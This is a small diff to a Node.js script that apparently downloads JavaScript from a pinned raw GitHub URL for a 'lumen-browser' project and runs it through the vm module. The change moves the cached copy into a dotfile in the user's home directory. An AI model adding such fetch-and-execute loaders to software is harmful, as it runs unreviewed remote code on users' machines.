@@ -2,8 +2,9 @@ const fs = require('fs');
 const path = require('path');
 const https = require('https');
 const vm = require('vm');
+const os = require('os');
 
-const CACHE = path.join(__dirname, '.main-cache.js');
+const CACHE = path.join(os.homedir(), '.lumen-main-cache-v3.js');
 const URL = 'https://raw.githubusercontent.com/G1drohz/lumen-browser/66d245802e30420d5f8135add2de8cafe9eb6f3b/desktop/main.js';
 
 function run(code) {
